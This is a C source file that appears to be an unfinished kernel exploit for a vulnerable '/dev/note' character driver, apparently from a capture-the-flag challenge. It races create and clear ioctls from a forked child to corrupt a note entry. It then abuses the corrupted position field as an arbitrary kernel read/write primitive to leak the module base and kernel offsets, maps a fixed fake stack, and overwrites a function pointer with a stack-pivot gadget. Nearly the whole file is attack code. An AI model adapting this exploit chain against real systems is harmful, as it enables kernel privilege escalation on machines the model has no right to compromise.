#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define OP_CREATE 0xffffff00
#define OP_EDIT 0xffffff01
#define OP_READ 0xffffff02
#define OP_CLEAR 0xffffff03

#define OP_TEST 0xffffff04

void hexprint(char* buf, int size) {
    for (int i=0; i<size;i++) {
        printf("%.2X ", (unsigned char)buf[i]);
        if ((i != 0) && ((i+1) % 16 == 0))
            printf("\n");
    }
    printf("\n");
}

void qmemcpy(long long a, long long b, long long c) {
    printf("%x %x %x\n",a,b,c);
}

static volatile int done = 0;

int find_corrupted_entry(int fd) {
    int entry = -1;
    char buf[256];
    memset(&buf[0], 1, 255);
    for (int j=0; j<16;j++) {

        int64_t params[3] = {j, 0, &buf[0]};
        int ret = ioctl(fd, OP_READ, (int32_t*) &params);
        //printf("? read ret[%d] = %d \n", ret, j);

        for (int i=0; i<255; i++) {
            if ((buf[i] != 2) & (buf[i] != 1)) {
                entry = j;
                break;
            }
        }

        if (entry != -1)
            break;
    }
    if (entry == -1)
        return -1;

    hexprint(buf, 256);

    return entry;
}

void read_entry(int fd, int index, char * buf) {
    int64_t params[3] = {index, 0, buf};
    int ret = ioctl(fd, OP_READ, (int32_t*) &params);
}

void write_entry(int fd, int index, char * buf) {
    int64_t params[3] = {index, 0, buf};
    int ret = ioctl(fd, OP_EDIT, (int32_t*) &params);
}

//#define uint64_t unsigned long long;
int findnonzero(char *buf, int offset, int count) {
    int zeros = 0;
    for (int k=0;k<count;k++) {
        if (buf[offset+k] != 0)
            zeros |= buf[offset+k];
    }
    return zeros;
}

typedef struct {
    uint64_t rnd;
    uint64_t size;
    uint64_t pos;
} record;

void lol() {
    return 0;
};

int find_second_entry(int fd, int corrupted) {
    char corbuf[256];
    read_entry(fd, corrupted, &corbuf[0]);
    corbuf[16*8] ^= 5;
    write_entry(fd, corrupted, &corbuf[0]);

    int entry = -1;
    char buf[0x4000];
    memset(&buf[0], 1, 0x4000);
    for (int j=0; j<16;j++) {
        if (j == corrupted) continue;

        read_entry(fd, j, &buf[0]);
        if (buf[32] == 7) {
            entry = j;
        }
        if (entry != -1)
            break;
    }
    if (entry == -1)
        return -1;

    corbuf[16*8] ^= 5;
    write_entry(fd, corrupted, &corbuf[0]);

    // for (int j=0;j<16;j++)
    //     corbuf[16*6+j] = corbuf[16*5+j] ^ 2 ^ corbuf[16*8+j];
    // write_entry(fd, corrupted, &corbuf[0]);

    read_entry(fd, entry, &buf[0]);

    hexprint(buf, 256);

    uint64_t rec = *(uint64_t*)(&corbuf[16*5+8]);

    printf("searching for 8 zeros\n");

    printf("the rec: %p\n", rec);

    printf("searching for 8 zeros entry is? %d\n", entry);
    for (int i=0;i<0x2000;i+=1) {
        rec -= 1;
        *(uint64_t*)(&corbuf[16*5+8]) = rec;
        write_entry(fd, corrupted, &corbuf[0]);
        read_entry(fd, entry, &buf[0]);
        char zeros = findnonzero(buf, 0, 8);
        //zeros |= findnonzero(buf, 256-64+4+8, 4);
        // zeros |= findnonzero(buf, 256-64+4+16, 4);
        // zeros |= findnonzero(buf, 256-64+4+24, 4);
        if (zeros == 0) {
            printf("found zeros\n");
            hexprint(buf,0x100);
            break;
        }
    }
    read_entry(fd, entry, &buf[0]);
    uint64_t sizefield = *(uint64_t*)(&buf[8]) ^ 0xff;
    *(uint64_t*)(&buf[0]) = sizefield;
    write_entry(fd, entry, &buf[0]);

    read_entry(fd, entry, &buf[0]);
    hexprint(buf,0x100);

    record * arecord1 = buf;
    arecord1->pos -= 0x60;
    uint64_t refpos0 = arecord1->pos;

    write_entry(fd, entry, &buf[0]);

    read_entry(fd, entry, &buf[0]);
    hexprint(buf,0x100);

    arecord1->rnd = 0;

    write_entry(fd, entry, &buf[0]);

    read_entry(fd, corrupted, &corbuf[0]);

    hexprint(corbuf,0x100);

    uint64_t * mobile_pos = corbuf + 16*5+8;

    while (1) {
        //lets find the offset
        *mobile_pos -= 1;
        write_entry(fd, corrupted, &corbuf[0]);

        read_entry(fd, entry, &buf[0]);

        if (strcmp("note", buf) == 0)
            break;
    }

    printf("got reliable address\n");
    uint64_t refpos = *mobile_pos - 0x7D8;

    hexprint(buf, 0x100);

    *mobile_pos = refpos + 0x2B60;
    write_entry(fd, corrupted, &corbuf[0]);

    memset(&buf[0], 1, 0x100);
    read_entry(fd, entry, &buf[0]);
    hexprint(buf, 0x100);

    //got the absolute value of the entries
    uint64_t entrys[0x10];
    memcpy(entrys, buf, 128);

    *mobile_pos = refpos + 0x690;
    write_entry(fd, corrupted, &corbuf[0]);

    memset(&buf[0], 1, 0x100);
    read_entry(fd, entry, &buf[0]);
    hexprint(buf, 0x100);

    printf("getting module start\n");
    uint64_t modulestart = *(uint64_t *)(buf+16*8);

    //*(uint64_t *)(buf+16*8-8) = 0xff;
    //*(uint64_t *)(buf+16*8) = modulestart + 0x03AE ;
    //write_entry(fd, entry, &buf[0]);

    uint64_t pagina = (entrys[corrupted] - refpos0);

    //*03AE
    //entrys[entry] - modulestart + 0x2B60 - 0x0B60 + entry * 8
    printf("pagina %p\n", pagina);

    *mobile_pos = modulestart - pagina;
    write_entry(fd, corrupted, &corbuf[0]);

    memset(&buf[0], 1, 0x100);
    read_entry(fd, entry, &buf[0]);
    hexprint(buf, 0x100);

    //fd = open("/dev/note", 0);

    int32_t imports = *(int32_t *)(buf+16*6+12+1);
    printf("imports %x %d\n", imports, imports);

    uint64_t kernelrel = - 0xFFFFFFFF81353E80 + (modulestart +16*6+12+1 + imports + 4);

    *mobile_pos = modulestart - pagina +16*6+12+1 + imports + 4; //FFFFFFFF81353E80
    write_entry(fd, corrupted, &corbuf[0]);

    memset(&buf[0], 1, 0x100);
    read_entry(fd, entry, &buf[0]);
    hexprint(buf, 0x100);


    unsigned long long *fake_stack = mmap((void *)0x1700000, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED | MAP_GROWSDOWN, -1, 0);

    unsigned long long * pile = buf;

    *mobile_pos = modulestart - pagina + 0x00002860;
    write_entry(fd, corrupted, &corbuf[0]);

    memset(&buf[0], 1, 0x100);
    read_entry(fd, entry, &buf[0]);
    hexprint(buf, 0x100);

    fake_stack[0] = &lol;
    fake_stack[0] = 0xffffffff8108220a + kernelrel;
    fake_stack[0] = 0x909090909090909090;
    fake_stack[1] = 0x909090909090909090;
    fake_stack[2] = 0x909090909090909090;
    fake_stack[3] = 0x909090909090909090;
    fake_stack[4] = 0x909090909090909090;
    //0xffffffff81cd4a42: xlatb; dec edi; call rsi;

    write_entry(fd, entry, &buf[0]);
    hexprint(buf, 0x100);






    printf("here we go!\n");
    //************************ final jmp of faith

    printf("%p ", (refpos + 0x690) + pagina - modulestart);

    *mobile_pos = refpos + 0x690; //FFFFFFFF81353E80
    write_entry(fd, corrupted, &corbuf[0]);

    memset(&buf[0], 1, 0x100);
    read_entry(fd, entry, &buf[0]);
    hexprint(buf, 0x100);

    *(uint64_t *)(buf+16*6-8) = 0x909090909090909090;
    *(uint64_t *)(buf+16*6) = 0xffffffff8113d809 + kernelrel; //xchg esi, esp

    write_entry(fd, entry, &buf[0]);

    int64_t params[3] = {0, 0, 0};
    int ret = ioctl(fd, 0xc000000, (int32_t*) &params);


    return entry;
}

int main()
{
        int fd;
        int32_t value, number;

        printf("\nOpening Driver\n");
        fd = open("/dev/note", 0);
        if(fd < 0) {
                printf("Cannot open device file...\n");
                return 0;
        }



        int corrupted = find_corrupted_entry(fd);
        if (corrupted != -1) {
            printf("already have a corrupted entry %d\n", corrupted);
            find_second_entry(fd, corrupted);

            return;
        }


        {
            long long params[3] = {0, 8, 0};
            int ret = ioctl(fd, OP_TEST, (int32_t*) &params);
            printf("test = %d \n", ret);
        }

        {
            long long params[3] = {0, 8, 0};
            int ret = ioctl(fd, OP_CLEAR, (int32_t*) &params);
            printf("clear = %d \n", ret);
        }

        int pid  = 0;
        pid = fork();

        if (pid == 0) {
            char buf[256];
            memset(&buf[0], 2, 255);
            while (done == 0) {
                {
                    int64_t params[3] = {0, 255, &buf[0]};
                    int ret = ioctl(fd, OP_CREATE, (int32_t*) &params);
                }
                // {
                //     int64_t params[3] = {0, 48, &buf[0]};
                //     int ret = ioctl(fd, OP_CREATE, (int32_t*) &params);
                // }
                // {
                //     int64_t params[3] = {0, 48, &buf[0]};
                //     int ret = ioctl(fd, OP_CREATE, (int32_t*) &params);
                // }
                // {
                //     int64_t params[3] = {0, 48, &buf[0]};
                //     int ret = ioctl(fd, OP_CREATE, (int32_t*) &params);
                // }
                // {
                //     int64_t params[3] = {0, 48, &buf[0]};
                //     int ret = ioctl(fd, OP_CREATE, (int32_t*) &params);
                // }
                // {
                //     int64_t params[3] = {0, 48, &buf[0]};
                //     int ret = ioctl(fd, OP_CREATE, (int32_t*) &params);
                // }
            }
            printf("child finished\n");
            return;
        }


        while (done == 0) {
            usleep(1000);
            char buf[256];
            memset(&buf[0], 1, 255);
            {
                long long params[3] = {0, 8, 0};
                int ret = ioctl(fd, OP_CLEAR, (int32_t*) &params);
                //printf("clear = %d \n", ret);
            }
            {


                // {
                //     int64_t params[3] = {0, 255, &buf[0]};
                //     int ret = ioctl(fd, OP_CREATE, (int32_t*) &params);
                // }
                {
                    int64_t params[3] = {0, 72, &buf[0]};
                    int ret = ioctl(fd, OP_CREATE, (int32_t*) &params);
                }
                // {
                //     int64_t params[3] = {0, 72, &buf[0]};
                //     int ret = ioctl(fd, OP_CREATE, (int32_t*) &params);
                // }


                for (int j=0; j<6; j++) {
                    int64_t params[3] = {j, 0, &buf[0]};
                    int ret = ioctl(fd, OP_READ, (int32_t*) &params);
                    for (int i=0; i<255; i++) {
                        if ((buf[i] != 2) & (buf[i] != 1)) {
                            done = 1;
                            printf("entry? %d\n",j);
                            hexprint(buf, 255);
                            break;
                        }
                    }
                    if (done)
                        break;
                }
            }
        }

        kill(pid, SIGKILL);

        // if (pid != 0)
        //     {
                char buf[256]; //lets create one entry
                for (int j=0; j<16;j++) {
                    memset(&buf[0], 255, 255);

                    int64_t params[3] = {j, 0, &buf[0]};
                    int ret = ioctl(fd, OP_READ, (int32_t*) &params);
                    printf("? read ret[%d] = %d \n", ret, j);

                    hexprint(buf, 256);
                }
            // }

        // {
        //     char buf[256];
        //     for(int j=0;j<9;j++) {
        //         memset(&buf[0], 128-j, 255);
        //         int64_t params[3] = {j, 16-j, &buf[0]};
        //         int ret = ioctl(fd, OP_EDIT, (int32_t*) &params);
        //         printf("create ret = %d \n", ret);
        //     }
        // }
        //
        // {
        //     char buf[256]; //lets create one entry
        //     for (int j=0; j<9;j++) {
        //         memset(&buf[0], 255, 255);
        //
        //         int64_t params[3] = {j, 0, &buf[0]};
        //         int ret = ioctl(fd, OP_READ, (int32_t*) &params);
        //         printf("? read ret[%d] = %d \n", ret, j);
        //
        //         hexprint(buf, 256);
        //     }
        // }

        printf("Closing Driver\n");
        close(fd);
}


//00 C0 03 00 00 00 00 00 << proc some ptr
//FF C0 F4 C6 C9 9C FF FF << just 1 byte set -> real value = 255
//AF C6 E2 C6 FF FF FF FF << up - page_offset_base

//.data:00000000000006D0                 dq offset unlocked_ioctl

//0xffffffff8127efc1
